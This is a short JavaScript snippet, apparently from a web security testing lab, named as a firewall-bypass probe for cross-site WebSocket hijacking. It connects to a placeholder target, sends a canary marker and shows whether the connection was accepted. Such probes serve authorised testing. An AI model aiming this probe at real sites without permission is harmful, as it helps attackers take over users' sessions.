wafBypass.command:
const socket = new WebSocket('wss://{TARGET}/ws/lab', ['chat', 'payloader-lab-v1']);
socket.onopen = () => socket.send(JSON.stringify({action: 'echo', marker: 'CSWSH_CANARY_WAF_V5'}));
socket.onmessage = e => { document.querySelector('#result').textContent = e.data; socket.close(1000, 'done'); };
socket.onerror = () => document.querySelector('#result').textContent = 'rejected';
